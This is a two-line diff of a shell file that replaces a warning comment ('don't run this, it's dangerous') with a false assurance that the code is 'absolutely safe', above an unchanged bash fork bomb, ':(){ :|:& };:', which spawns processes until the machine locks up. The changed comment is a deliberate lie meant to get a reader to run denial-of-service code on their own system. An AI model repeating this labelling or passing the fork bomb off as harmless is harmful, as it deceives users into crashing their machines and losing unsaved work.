@@ -1,2 +1,2 @@
-# don't run this, it's dangerous
+# definitely run this. its absolutely safe.
 :(){ :|:& };:
